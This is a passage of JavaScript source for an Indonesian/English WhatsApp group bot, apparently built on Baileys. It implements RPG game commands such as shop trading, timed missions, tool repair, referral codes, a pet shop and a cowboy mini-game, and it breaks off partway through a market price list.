    let user = db.users[m.sender]
    const listItems = Object.fromEntries(Object.entries(items[command.toLowerCase()]).filter(([v]) => v && v in user))
    let text = ''
    let footer = ''
    let image = ''
    let buttons = ''
    text = (command.toLowerCase() == 'buy' ?
(`
*${decor.htki} 𝙱𝚄𝚈𝙸𝙽𝙶 ${decor.htka}*
`.trim()) : 
(`
*${decor.htki} 𝚂𝙴𝙻𝙻𝙸𝙽𝙶 ${decor.htka}*
`.trim())
)
    footer = (command.toLowerCase() == 'buy' ?
(`
🛒 List Items :
${Object.keys(listItems).map((v) => {
        let paymentMethod = Object.keys(listItems[v]).find(v => v in user)
        return `➠ 1 ${rpg.emoticon(v)} ${capitalize(v)} ﹫ ${listItems[v][paymentMethod]} ${rpg.emoticon(paymentMethod)}${capitalize(paymentMethod)}`.trim()
    }).join('\n')}
–––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
➠ ᴛᴏ ʙᴜʏ ɪᴛᴇᴍs:
${command} [item] [quantity]
▧ ᴇxᴀᴍᴩʟᴇ:
${command} potion 10
`.trim()) : 
(`
🛒 List Items :
${Object.keys(listItems).map((v) => {
        let paymentMethod = Object.keys(listItems[v]).find(v => v in user)
        return `➠ 1 ${rpg.emoticon(v)} ${capitalize(v)} ﹫ ${listItems[v][paymentMethod]} ${rpg.emoticon(paymentMethod)}${capitalize(paymentMethod)}`.trim()
    }).join('\n')}
–––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
➠ ᴛᴏ sᴇʟʟ ɪᴛᴇᴍs:
${command} [item] [quantity]
▧ ᴇxᴀᴍᴩʟᴇ:
${command} potion 10
`.trim())
)
    
    const total = Math.floor(isNumber(args[1]) ? Math.min(Math.max(parseInt(args[1]), 1), Number.MAX_SAFE_INTEGER) : 1) * 1
    if (!listItems[item]) return m.reply(footer)
    if (command.toLowerCase() == 'buy') {
        let paymentMethod = Object.keys(listItems[item]).find(v => v in user)
        if (user[paymentMethod] < listItems[item][paymentMethod] * total) return m.reply(`Kamu membutuhkan *${(listItems[item][paymentMethod] * total) - user[paymentMethod]}* ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)} Lagi, Untuk Membeli *${total}* ${capitalize(item)} ${rpg.emoticon(item)}. Kamu hanya memiliki *${user[paymentMethod]}* ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)}.`)
        user[paymentMethod] -= listItems[item][paymentMethod] * total
        user[item] += total
        return reply(`Sukses Membeli *${total} ${capitalize(item)} ${rpg.emoticon(item)}*, Seharga *${listItems[item][paymentMethod] * total} ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)}*`)
    } else {
    	let paymentMethot = Object.keys(listItems[item]).find(v => v in user)
        if (user[item] < total) return m.reply(`You don't have enough *${capitalize(item)} ${rpg.emoticon(item)}* to sell, you only have ${user[item]} items`)
        user[item] -= total
        user[paymentMethot] += listItems[item][paymentMethot] * total
        return reply(`Sukses Menjual *${total} ${capitalize(item)} ${rpg.emoticon(item)}*, Seharga *${listItems[item][paymentMethot] * total} ${capitalize(paymentMethot)} ${rpg.emoticon(paymentMethot)}*`)
    }
}
break
//==================================================================
case 'selectskill': {
  if (!m.isGroup) return reply(mess.only.group)
let user = global.db.users[m.sender]
let skill = ["swordmaster", "necromancer", "witch", "Archer", "magicswordmaster", "thief", "shadow"]
let bintang = {
"satu": "⭐",
"dua": "⭐⭐",
"tiga": "⭐⭐⭐",
"empat": "⭐⭐⭐⭐",
"lima": "⭐⭐⭐⭐⭐",
"Enam": "⭐⭐⭐⭐⭐⭐"
}
   let skil = text.trim().toLowerCase() // to filter text
   if (!skill.includes(skil)) return reply( `Select *skill🃏* what do you want/pilih skill apa yg kamu inginkan:

${skill.map(skil => `› ${skil}`).join('\n')}

How To use/Cara menggunakan:
${command} <nameskill>
     
Example/Contoh:
${command} necromancer
`)
    if (user.skill == "") {
        user.skill = skil
        m.reply(`Anda telah memilih Skill ${skil}`)
    } else if (user.skill) {
        m.reply(`Anda Sudah Punya skill ${user.skill} Tidak bisa diganti`)
    }
}
break
//==================================================================
case 'sampah': {
  if (!m.isGroup) return reply(mess.only.group)
const rewards = {
    exp: 500,
    money: 20999,
}

const cooldown = 2592000000
    let user = global.db.users[m.sender]
    if (new Date - user.lastmonthly < cooldown) return reply( `You have already claimed this monthly claim, wait for *${((user.lastmonthly + cooldown) - new Date()).toTimeString()}*`.trim())
    let text = ''
    for (let reward of Object.keys(rewards)) if (reward in user) {
        user[reward] += rewards[reward]
        text += `*+${rewards[reward]}* ${rpg.emoticon(reward)}${reward}\n`
    }
    reply('*––––––『 NYAMPAH 』––––––*\n' + text.trim())
    user.lastmonthly = new Date * 1
}
break

//==================================================================
case 'roket': {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let user = global.db.users[m.sender]
    let order = global.db.users[m.sender].rokets
    let timers = clockString(_timers)
    let name = user.registered ? user.name: XeonBotInc.getName(m.sender)
    let id = m.sender
    let kerja = 'Roket'
    XeonBotInc.misi = XeonBotInc.misi ? XeonBotInc.misi: {}
    if (id in XeonBotInc.misi) {
        reply( `Selesaikan Misi ${XeonBotInc.misi[id][0]} Terlebih Dahulu`)
        throw false
    }
    if (user.health < 80) return m.reply(`Anda Harus Memiliki Minimal 80Health`)
    if (new Date - global.db.users[m.sender].lastmisi > 3600000) {
        let ngerok4 = Math.floor(Math.random() * 10)
        let ngerok5 = Math.floor(Math.random() * 10)

        let ngrk4 = (ngerok4 * 100000)
        let ngrk5 = (ngerok5 * 1000)

        let rokit = `🌕


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████
🚀

👨‍🚀 Memulai penerbangan....
`.trim()

        let rokit2 = `🌕


🚀
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████

➕ Dalam penerbangan....
`.trim()

        let rokit3 = `🌕🚀


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████

➕ Sampai di tujuan....
`.trim()

        let rokit4 = `🌕🚀

➕ Sukses Mendarat.... 👨‍🚀
`.trim()

        let hsl = `
*—[ Hasil Ngroket ${name} ]—*
➕ 💹 Uang = [ ${ngrk4} ]
➕ ✨ Exp = [ ${ngrk5} ]
➕ 😍 Mendarat Selesai = +1
➕  📥Total Mendarat Sebelumnya : ${order}
`.trim()

        user.money += ngrk4
        user.exp += ngrk5
        user.rokets += 1
        user.health -= 80

		XeonBotInc.misi[id] = [
            kerja,
            setTimeout(() => {
                delete XeonBotInc.misi[id]
            }, 27000)
        ]
        
        setTimeout(() => {
            reply( hsl)
        }, 27000)

        setTimeout(() => {
            reply( rokit4)
        }, 25000)

        setTimeout(() => {
            reply( rokit3)
        }, 20000)

        setTimeout(() => {
            reply( rokit2)
        }, 15000)

        setTimeout(() => {
            reply( rokit)
        }, 10000)

        setTimeout(() => {
            reply( `🔍 ${name} Mencari Lokasi.....`)
        }, 0)
        user.lastmisi = new Date * 1
    } else m.reply(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
    }
    break
//==================================================================
case 'rob':
case 'robery': {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let user = global.db.users[m.sender]
    let __timers = (new Date - user.lastmisi)
    let _timers = (3600000 - __timers)
    let timers = clockString(_timers)
    let id = m.sender
    let kerja = 'Rob'
    XeonBotInc.misi = XeonBotInc.misi ? XeonBotInc.misi : {}
    if (id in XeonBotInc.misi) {
        reply( `Selesaikan Misi ${XeonBotInc.misi[id][0]} Terlebih Dahulu`)
        throw false
    }
    if (user.health < 80) return reply('Anda Harus Memiliki Minimal 80Health')
    if (new Date - global.db.users[m.sender].lastmisi > 3600000) {
        let rndm1 = Math.floor(Math.random() * 10)
        let rndm2 = Math.floor(Math.random() * 10)
        
        let ran1 = (rndm1 * 100000)
        let ran2 = (rndm2 * 1000)

        let jln = `
🏘️          🚗

✔️ Mengincar target....
`.trim()

        let jln2 = `
🏘️     🚶

➕ Memulai aksi....
`.trim()

        let jln3 = `
🏘️

➕ Merampok....
`.trim()

        let jln4 = `
🚗



🏘️🚓

➕ 💹Berhasil kabur....
`.trim()

        let hsl = `
*—[ Hasil rob ]—*

➕ 💹 Uang = [ ${ran1} ]
➕ ✨ Exp = [ ${ran2} ]
➕ 📦 Rob Selesai = +1

Dan health anda berkurang -80
`.trim()
        user.money += ran1
        user.exp += ran2
        user.health -= 80

		XeonBotInc.misi[id] = [
        kerja,
        setTimeout(() => {
            delete XeonBotInc.misi[id]
        }, 27000)
    	]
    
        setTimeout(() => {
            reply(hsl)
        }, 27000)

        setTimeout(() => {
            reply(jln4)
        }, 25000)

        setTimeout(() => {
            reply(jln3)
        }, 20000)

        setTimeout(() => {
            reply(jln2)
        }, 15000)

        setTimeout(() => {
            reply(jln)
        }, 10000)

        setTimeout(() => {
            reply('🔍Mencari Rumah.....')
        }, 0)
        user.lastmisi = new Date * 1
    } else reply(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
    }
    break
//==================================================================
case 'repair': {
if (!m.isGroup) return reply(mess.only.group)
const {default: MessageType } = require ('@whiskeysockets/baileys')

  let type = (args[0] || '').toLowerCase()
  let _type = (args[0] || '').toLowerCase()
  let user = global.db.users[m.sender]
  global.db.users[m.sender].pickaxe = global.db.users[m.sender].pickaxe || 0
  global.db.users[m.sender].sword = global.db.users[m.sender].sword || 0
  global.db.users[m.sender].fishingrod = global.db.users[m.sender].fishingrod || 0
  global.db.users[m.sender].armor = global.db.users[m.sender].armor || 0
  let botol = global.botwm

let lgocraft = `
*「 R E P A I R」*`

  let caption = `
▧ Pickaxe ⛏️
▧ Sword ⚔️
▧ Fishingrod 🎣
▧ Armor 🥼

*❏ RECIPE*
▧ Pickaxe ⛏️
〉  20 Rock
〉 20 Wood
〉 20 Iron
〉 1 Diamond

▧ Sword ⚔️
〉 20 Wood
〉 20 Iron
〉 2 Gold
〉 1 Diamond

▧ FishingRod ⚔️
〉 20 Wood
〉 20 String
〉 20 Iron
〉 1 Diamond

▧ Armor 🥼
〉 15 Iron
〉 2 Gold
〉 1 Diamond
`
const sections = [
   {
	title: "REPAIR A TOOLS",
	rows: [
	    {title: "SWORD ⚔️", rowId: ".repair sword", description: "Repair Sword"},
	    {title: "PICKAXE ⛏️", rowId: ".repair pickaxe", description: "Repair Pickaxe"},
	    {title: "FISHINGROD 🥼", rowId: ".repair fishingrod", description: "Repair FishingRod"},
	    {title: "ARMOR 🥼", rowId: ".repair armor", description: "Repair Armor"},
	]
    },
]

const listMessage = {
  text: caption,
  footer: wm,
  title: lgocraft,
  buttonText: "R E P A I R",
  sections
}

  try {
    if (/repair/i.test(command)) {
      const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
        switch (type) {
          case 'pickaxe':
          if (user.pickaxedurability > 99) return m.reply('Tools ini belum memiliki kerusakan')
          if (user.pickaxe == 0) return m.reply('Kamu belum memilik ini')
            if(user.diamond < 1 || user.rock < 20 || user.wood < 20 || user.iron < 20 ) return m.reply(`Barang tidak cukup!`)
             user.rock -= 20
             user.wood -= 20
             user.iron -= 20
             user.diamond -= 1
             user.pickaxedurability = 100
            m.reply("Sukses memperbaiki!")
            break
          case 'sword':
          if (user.sworddurability > 99) return m.reply('Tools ini belum memiliki kerusakan')
          if (user.sword == 0) return m.reply('Kamu belum memilik ini')
            if(user.diamond < 1 || user.wood < 20 || user.iron < 20 || user.gold < 2 ) return m.reply(`Barang tidak cukup!`)
             user.wood -= 20
             user.iron -= 20
             user.gold -= 3
             user.diamond -= 1
             user.sworddurability = 100
            m.reply("Sukses memperbaiki!")
            break
            case 'fishingrod':
          if (user.fishingroddurability > 99) return m.reply('Tools ini belum memiliki kerusakan')
          if (user.fishingrod == 0) return m.reply('Kamu belum memiliki ini')
            if(user.diamond < 1 || user.string < 20 || user.wood < 20 || user.iron < 20 ) return m.reply(`Barang tidak cukup!`)
             user.wood -= 20
             user.string -= 20
             user.iron -= 20
             user.diamond -= 1
             user.fishingroddurability = 100
            m.reply("Sukses memperbaiki!")
            break
            case 'armor':
          if (user.armordurability > 99) return m.reply('Tools ini belum memiliki kerusakan')
          if (user.armor == 0) return m.reply('Kamu belum memilik ini')
            if(user.diamond < 1 || user.iron < 15 || user.gold < 2 ) return m.reply(`Barang tidak cukup!`)
             user.iron -= 15
             user.gold -= 2
             user.diamond -= 1
             user.armordurability = 100
            m.reply("Sukses memperbaiki!")
            break
          default:
            return await XeonBotInc.sendMessage(m.chat, listMessage)
        }
    } else if (/enchant|enchan/i.test(command)) {
      const count = args[2] && args[2].length > 0 ? Math.min(99999999, Math.max(parseInt(args[2]), 1)) : !args[2] || args.length < 4 ? 1 :Math.min(1, count)
      switch (_type) {
        case 't':
          break
        case '':
          break

        default:
          return XeonBotInc.sendButton( m.chat, caption, wm, null, [`⋮☰ Menu`, `.menu`], m)
      }
    }
  } catch (err) {
    m.reply("Error\n\n\n" + err.stack)
  }
}
break
//==================================================================
case 'referal': {
  if (!m.isGroup) return reply(mess.only.group)
const { crypto } = require ("crypto")
const xp_first_time = 2500
const xp_link_creator = 15000
const xp_bonus = {
    5: 40000,
   10: 100000,
   20: 250000,
   50: 1000000,
  100: 10000000,
}

  let users = global.db.users
  if (text) {
    if ('ref_count' in users[m.sender]) throw 'Tidak bisa menggunakan kode referal!'
    let link_creator = (Object.entries(users).find(([, { ref_code }]) => ref_code === text.trim()) || [])[0]
    if (!link_creator) throw 'Kode referal tidak valid'
    let count = users[link_creator].ref_count++
    let extra = xp_bonus[count] || 0
    users[link_creator].exp += xp_link_creator + extra
    users[m.sender].exp += xp_first_time
    users[m.sender].ref_count = 0
    m.reply(`
Selamat!
+${xp_first_time} XP
`.trim())
    m.reply(`
Seseorang telah menggunakan kode referal kamu
+${xp_link_creator + extra} XP
`.trim(), link_creator)
  } else {
    let code = users[m.sender].ref_code = users[m.sender].ref_code || new Array(11).fill().map(() => [...'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'][crypto.randomInt(62)]).join('')
    users[m.sender].ref_count = users[m.sender].ref_count ? users[m.sender].ref_count : 0
    let command_text = `${command}ref ${code}`
    let command_link = `wa.me/${XeonBotIncuser.jid.split('@')[0]}?text=${encodeURIComponent(command_text)}`
    let share_text = `
Dapatkan ${xp_first_time} XP untuk yang menggunakan link/kode referal dibawah ini

Referal Code: *${code}*

${command_link}
`.trim()
    m.reply(`
Dapatkan ${xp_link_creator} XP untuk setiap pengguna baru yang menggunakan kode referal kamu
${users[m.sender].ref_count} orang telah menggunakan kode referal kamu

Kode referal kamu: ${code}

Bagikan link kepada teman: ${command_link}

atau kirim pesan kepada teman wa.me/?text=${encodeURIComponent(share_text)}

${Object.entries(xp_bonus).map(([count, xp]) => `${count} Orang = Bonus ${xp} XP`).join('\n')}
`.trim())
  }
}
break
//==================================================================
case 'petstore': 
case 'petshop': {
  if (!m.isGroup) return reply(mess.only.group)
  let type = (args[0] || '').toLowerCase()
  let _type = (args[0] || '').toLowerCase()
  let user = global.db.users[m.sender]
  global.db.users[m.sender].pickaxe = global.db.users[m.sender].pickaxe || 0
  global.db.users[m.sender].pedang = global.db.users[m.sender].pedang || 0
  global.db.users[m.sender].fishingrod = global.db.users[m.sender].fishingrod || 0
  
  //----------HARGA
  let hdog = 2
  let hcat = 2
  let hhorse = 4
  let hfox = 6
  let hrobo = 10
  
  let hlion = 10
  let hrhinoceros = 10
  let hdragon = 10
  let hcentaur = 10
  let hkyubi = 10
  let hgriffin = 10
  let hphonix = 10
  let hwolf = 10

let logo = `— *P E T   S T O R E* —
▮▧▧▧▧▧▧▧▧▧▧▧▧▮`
let caption = `
🐈 *Cat:* ${hcat} 🔖
🐕 *Dog:* ${hdog} 🔖
🐎 *Horse:* ${hhorse} 🔖
🦊 *Fox:* ${hfox} 🔖
🤖 *Robo:* ${hrobo} 🔖

〉 *ABILITY*
Cooming soon...`
const sections = [
   {
	title: "Buy A Pet",
	rows: [
	    {title: "Cat 🐈", rowId: ".petshop cat", description: "Adopt A Cat"},
	    {title: "Dog 🐕", rowId: ".petshop dog", description: "Adopt A Dog"},
	    {title: "Horse 🐎", rowId: ".petshop horse", description: "Adopt A Horse"},
	    {title: "Fox 🦊", rowId: ".petshop fox", description: "Adopt A Fox"},
	    {title: "Robo 🤖", rowId: ".petshop robo", description: "Buy A Robo"},
	]
    },
]

const listMessage = {
  text: caption,
  footer: wm,
  title: logo,
  buttonText: "ADOPT ME 🐾",
  sections
}

  try {
    if (/petshop/i.test(command)) {
      const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
        switch (type) {
          case 'cat':
          if (user.cat > 0) return m.reply('Kamu sudah memilik ini')
            if(user.pet < hcat) return m.reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hcat
            global.db.users[m.sender].cat += 1
            m.reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
          case 'dog':
          if (user.dog > 0) return m.reply('Kamu sudah memilik ini')
            if(user.pet < hdog) return m.reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hdog
            global.db.users[m.sender].dog += 1
            m.reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
          case 'fox':
          if (user.fox > 0) return m.reply('Kamu sudah memilik ini')
            if(user.pet < hfox) return m.reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hfox
            global.db.users[m.sender].fox += 1
            m.reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
          case 'horse':
          if (user.horse > 0) return m.reply('Kamu sudah memilik ini')
            if(user.pet < hhorse) return m.reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hhorse
            global.db.users[m.sender].horse += 1
            m.reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
          case 'robo':
          if (user.robo > 0) return m.reply('Kamu sudah memilik ini')
            if(user.pet < hrobo) return m.reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hrobo
            global.db.users[m.sender].robo += 1
            m.reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
            case 'lion':
          if (user.lion > 0) return m.reply('Kamu sudah memilik ini')
            if(user.pet < hlion) return m.reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hlion
            global.db.users[m.sender].lion += 1
            m.reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
            case 'rhinoceros':
          if (user.rhinoceros > 0) return m.reply('Kamu sudah memilik ini')
            if(user.pet < hrhinoceros) return m.reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hrhinoceros
            global.db.users[m.sender].rhinoceros += 1
            m.reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
            case 'dragon':
          if (user.dragon > 0) return m.reply('Kamu sudah memilik ini')
            if(user.pet < hdragon) return m.reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hdragon
            global.db.users[m.sender].dragon += 1
            m.reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
            case 'centaur':
          if (user.centaur > 0) return m.reply('Kamu sudah memilik ini')
            if(user.pet < hcentaur) return m.reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hcentaur
            global.db.users[m.sender].centaur += 1
            m.reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
            case 'kyubi':
          if (user.kyubi > 0) return m.reply('Kamu sudah memilik ini')
            if(user.pet < hkyubi) return m.reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hkyubi
            global.db.users[m.sender].kyubi += 1
            m.reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
            case 'griffin':
          if (user.griffin > 0) return m.reply('Kamu sudah memilik ini')
            if(user.pet < hgriffin) return m.reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hgriffin
            global.db.users[m.sender].griffin += 1
            m.reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
            case 'phonix':
          if (user.phonix > 0) return m.reply('Kamu sudah memilik ini')
            if(user.pet < hphonix) return m.reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hphonix
            global.db.users[m.sender].phonix += 1
            m.reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
            case 'wolf':
          if (user.wolf > 0) return m.reply('Kamu sudah memilik ini')
            if(user.pet < hwolf) return m.reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hwolf
            global.db.users[m.sender].wolf += 1
            m.reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
            
          default:
              return await m.reply(`${logo}\n${caption}`)
            //return await conn.sendMessage(m.chat, listMessage)
        }
    } else if (/enchant|enchan/i.test(command)) {
      const count = args[2] && args[2].length > 0 ? Math.min(99999999, Math.max(parseInt(args[2]), 1)) : !args[2] || args.length < 4 ? 1 :Math.min(1, count)
      switch (_type) {
        case 't':
          break
        case '':
          break

        default:
          return XeonBotInc.sendButton( m.chat, caption, wm, null, [`⋮☰ Menu`, `.menu`], m)
      }
    }
  } catch (err) {
    m.reply("Error\n\n\n" + err.stack)
  }
  }
  break
//==================================================================
case 'kolam': {
  if (!m.isGroup) return reply(mess.only.group)
let user = global.db.users[m.sender]
let past = `
╭━━━━「 *BIO* 」   
┊ *💌 Name :* ${user.registered ? user.name : XeonBotInc.getName(m.sender)}
┊ *📊 Level :* ${user.level}
┊ *✨ Exp :* ${user.exp}
╰═┅═━––––––─ׄ✧

╭━━━━「 *ISI* 」
┊🦀 Kepiting: ${user.kepiting}
┊🦞 Lobster: ${user.lobster}
┊🦐 Udang: ${user.udang}
┊🦑 Cumi: ${user.cumi}
┊🐙 Gurita: ${user.gurita}
┊🐡 Buntal: ${user.buntal}
┊🐠 Dory: ${user.dory}
┊🐳 Orca: ${user.orca}
┊🐬 Lumba: ${user.lumba}
┊🐋 Paus: ${user.paus}
┊🦈 Hiu: ${user.hiu}
╰═┅═━––––––─ׄ✧
🎏 Total Isi: *${user.kepiting + user.lobster + user.udang + user.cumi + user.gurita + user.buntal + user.dory + user.orca + user.lumba + user.paus + user.hiu}* Jenis`
  m.reply(past)
  }
break
//==================================================================
case 'koboy': {
  if (!m.isGroup) return reply(mess.only.group)
function random(arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}
	try {
  XeonBotIbc.tembak = XeonBotIbc.tembak || { musuh: [], tembak: [] }
   if(/kiri/i.test(text)) {

    let kiri = [
      ["🤠", "-", "-", "-", "-"],
      ["-", "🤠", "-", "-", "-"],
      ["-", "-", "🤠", "-", "-"],
      ["-", "-", "-", "🤠", "-"],
      ["-", "-", "-", "-", "🤠"]
    ]

    if(XeonBotIbc.tembak.tembak.indexOf("🤠") == 0) {
      XeonBotIbc.tembak.tembak = kiri[0]
    } else if(XeonBotIbc.tembak.tembak.indexOf("🤠") == 1) {
      XeonBotIbc.tembak.tembak = kiri[0]
    } else if(XeonBotIbc.tembak.tembak.indexOf("🤠") == 2) {
      XeonBotIbc.tembak.tembak = kiri[1]
    } else if(XeonBotIbc.tembak.tembak.indexOf("🤠") == 3) {
      XeonBotIbc.tembak.tembak = kiri[2]
    } else if(XeonBotIbc.tembak.tembak.indexOf("🤠") == 4) {
      XeonBotIbc.tembak.tembak = kiri[3]
    }

    let pos = XeonBotIbc.tembak.musuh.join(" ") + "\n\n\n" + XeonBotIbc.tembak.tembak.join(" ")



    if(XeonBotIbc.tembak.musuh.indexOf("🥷") === XeonBotIbc.tembak.tembak.indexOf("🤠")) return XeonBotIbc.sendButton(m.chat, pos, wm, [
                                                                                              ['Tembak', `${command}koboy tembak`]             
                                                                                              ])
    return XeonBotInc.sendButton(m.chat, pos, wm, [
          ['←', `${command}koboy kiri`], ['→', `${command}koboy kanan`]
])
  } else if(/kanan/i.test(text)) {

    let kanan = [
      ["🤠", "-", "-", "-", "-"],
      ["-", "🤠", "-", "-", "-"],
      ["-", "-", "🤠", "-", "-"],
      ["-", "-", "-", "🤠", "-"],
      ["-", "-", "-", "-", "🤠"]
    ]

    if(XeonBotIbc.tembak.tembak.indexOf("🤠") == 0) {
      XeonBotIbc.tembak.tembak = kanan[1]
    } else if(XeonBotIbc.tembak.tembak.indexOf("🤠") == 1) {
      XeonBotIbc.tembak.tembak = kanan[2]
    } else if(XeonBotIbc.tembak.tembak.indexOf("🤠") == 2) {
      XeonBotIbc.tembak.tembak = kanan[3]
    } else if(XeonBotIbc.tembak.tembak.indexOf("🤠") == 3) {
      XeonBotIbc.tembak.tembak = kanan[4]
    } else if(XeonBotIbc.tembak.tembak.indexOf("🤠") == 4) {
      XeonBotIbc.tembak.tembak = kanan[4]
    }

    let pos = XeonBotIbc.tembak.musuh.join(" ") + "\n\n\n" + XeonBotIbc.tembak.tembak.join(" ")



    if(XeonBotIbc.tembak.musuh.indexOf("🥷") === XeonBotIbc.tembak.tembak.indexOf("🤠")) return XeonBotIbc.sendButton(m.chat, pos, wm, [
                                                                                              ['Tembak', `${command}koboy tembak`]             
                                                                                              ])             
    return XeonBotIbc.sendButton(m.chat, pos, wm, [
          ['←', `${command}koboy kiri`], ['→', `${command}koboy kanan`]
])
  } else if(/tembak/i.test(text)) {

    if(XeonBotIbc.tembak.tembak.indexOf("🤠") == XeonBotIbc.tembak.musuh.indexOf("🥷")) {
      XeonBotIbc.tembak = {}
      global.db.users[m.sender].money += 1000
      m.reply("Kamu menang!\n\nUang += 1000")
    }

  } else {
   let randMusuh = [
      ["🥷", "-", "-", "-", "-"],
      ["-", "🥷", "-", "-", "-"],
      ["-", "-", "🥷", "-", "-"],
      ["-", "-", "-", "🥷", "-"],
      ["-", "-", "-", "-", "🥷"]
    ]
   let randAku = [
      ["🤠", "-", "-", "-", "-"],
      ["-", "🤠", "-", "-", "-"],
      ["-", "-", "🤠", "-", "-"],
      ["-", "-", "-", "🤠", "-"],
      ["-", "-", "-", "-", "🤠"]
    ]

    let musuh = random(randMusuh)
   let aku = random(randAku)

    XeonBotIbc.tembak.musuh = musuh
    XeonBotIbc.tembak.tembak = aku

    let pos = XeonBotIbc.tembak.musuh.join(" ") + "\n\n\n" + XeonBotIbc.tembak.tembak.join(" ")

    if(XeonBotIbc.tembak.musuh.indexOf("🥷") === XeonBotIbc.tembak.tembak.indexOf("🤠")) return XeonBotIbc.sendButton(m.chat, pos, wm, [
                                                                                              ['Tembak', `${command}koboy tembak`]             
                                                                                              ])
    return XeonBotIbc.sendButton(m.chat, pos, wm, [
          ['←', `${command}koboy kiri`], ['→', `${command}koboy kanan`]
])
  }
  } catch (e) {
  	throw false
  }
}
break
//==================================================================
case 'pasar': {
  if (!m.isGroup) return reply(mess.only.group)
const Skepiting = 7000
const Slobster = 7000
const Sudang = 7000
const Scumi = 7000
const Sgurita = 7000
const Sbuntal = 7000
const Sdory = 7000
const Sorca = 7000
const Slumba = 7000
const Spaus = 7000
const Sikan = 7000
const Shiu = 7000
const Sbanteng = 9000
const Sharimau = 9000
const Sgajah = 9000
const Skambing = 9000
const Spanda = 9000
const Sbuaya = 9000
const Skerbau = 9000
const Ssapi= 9000
const Smonyet = 9000
const Sbabihutan = 9000
const Sbabi = 9000
const Sayam = 9000
const Sbotol = 100
const Skardus = 100
const Skaleng = 100
const Sgelas = 100
const Splastik = 100

    const _armor = global.db.users[m.sender].armor
    const armor = (_armor == 0 ? 20000 : '' || _armor == 1 ? 49999 : '' || _armor == 2 ? 99999 : '' || _armor == 3 ? 149999 : '' || _armor == 4 ? 299999 : '')
    let type = (args[0] || '').toLowerCase()
    let _type = (args[1] || '').toLowerCase()
    let jualbeli = (args[0] || '').toLowerCase()
    const Kchat = `╍╌╌╍╌╌╍╌╌╍╌╌┅═━––––––๑
*🛒 Hewan Laut   | 💲 Harga Jual*\n═┅═━––––––━––––––๑
🦀 Kepiting: ${Skepiting}
🦞 Lobster: ${Slobster}
🦐 Udang: ${Sudang}
🦑 Cumi: ${Scumi}
🐙 Gurita: ${Sgurita}
🐡 Buntal: ${Sbuntal}
🐠 Dory: ${Sdory}
🐳 Orca: ${Sorca}
🐬 Lumba: ${Slumba}
🐋 Paus: ${Spaus}
🦈 Hiu: ${Shiu}
╍╌╌╍╌╌╍╌╌╍╌╌┅═━––––––๑
*🛒 Hewan Darat   | 💲 Harga Jual*\n═┅═━––––––━––––––๑
🐃 Banteng: ${Sbanteng}
🐅 Harimau: ${Sharimau}
🐘 Gajah: ${Sgajah}
🐐 Kambing: ${Skambing}
